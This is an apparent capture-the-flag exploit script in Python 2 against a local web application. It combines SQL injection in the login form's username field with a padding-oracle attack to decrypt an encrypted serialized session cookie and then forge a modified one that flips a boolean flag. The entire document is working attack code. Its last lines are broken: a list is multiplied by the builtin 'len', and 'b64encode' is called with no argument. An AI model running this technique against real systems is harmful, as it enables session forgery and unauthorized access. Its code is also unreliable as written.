import requests
import base64

url = "http://localhost:10080"
N = 16

def xor(a, b):
    return "".join([chr(ord(a[i]) ^ ord(b[i % len(b)])) for i in xrange(len(a))])

def pad(string,N):
    l = len(string)
    if l != N:
        return string+chr((N-l))*(N-l)

def inject(password):
    param = {"username":"'UNION SELECT hogehoge,'{}".format(password), "password": ""}
    result = requests.post(url, data=param)
    return result


def padding_oracle(N,cipher,plain):
    get = ""
    for i in xrange(1,N+1):
        for j in xrange(0,256):
            padding = xor(get,chr(i)*(i-1))
            c = 'a'*(16-i)+chr(j)+padding+cipher
            result = inject(base64.b64encode(chr(0)*16+c))
            if "Hello" not in result.content:
                get=chr(j^i)+get
                print get.encode('hex')
                break
    return xor(get,plain)

jsession = inject("hoge").headers['set-cookie'].split('=')[1].replace("%3D",'=').replace("%2F",'/').replace("%2B",'+').decode('base64')

serialize = jsession[:-N]
print(serialize)

p = []
for i in xrange(0,len(serialize),N):
    p.append(serialize[i:i+N])

l = len(p)
p[l-1] = pad(p[l-1],N)
c = [""]*l
c[l-1] = jsession[-N:]

for i in xrange(l-1,0,-1):
    c[i-1] = padding_oracle(N,c[i],p[i])

p[4] = pad(';b:1}',N)
p[2] = xor(xor(c[3],c[4]),c[1])

param={'username':"' union select 'hogehog{new_p}e','hoge".format(new_p=p[2]),'password':''}
result=requests.post(url,data=param)

jsession=result.headers['set-cookie'].split('=')[1].replace("%3D",'=').replace("%2F",'/').replace("%2B",'+').decode('base64')
print(c)
c = [""]*len
serialize = jsession[:-N]

p = []
for i in xrange(0,len(serialize),N):
    p.append(serialize[i:i+N])

p[l-1] = pad(p[l-1],N)
c[l-1] = jsession[-N:]
for i in xrange(l-1,1,-1):
    c[i-1] = padding_oracle(N,c[i],p[i])

print(c)

new_jsession = base64.b64encode()
